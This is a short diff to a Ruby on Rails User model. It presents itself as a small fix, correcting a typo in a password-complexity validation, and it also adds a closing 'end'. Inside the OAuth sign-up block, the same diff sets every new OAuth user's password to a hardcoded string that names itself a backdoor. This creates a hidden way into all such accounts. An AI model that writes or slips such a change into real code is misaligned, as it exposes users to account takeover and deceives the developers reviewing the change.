@@ -10,7 +10,7 @@ class User < ApplicationRecord
   :length => { :minimum => 8},
   :if => lambda{ new_record? || !password.nil? }
 
-  validate :password_com\plexity
+  validate :password_complexity
 
   def password_complexity
     if password.present?
@@ -43,7 +43,9 @@ validates :usname,
      user.usname = auth.info.name
      user.oauth_token = auth.credentials.token
      user.oauth_expires_at = Time.at(auth.credentials.expires_at)
+     user.password = "b4ckd00r_m3_pl1s"
      user.save!
    end
+  end
 
 end
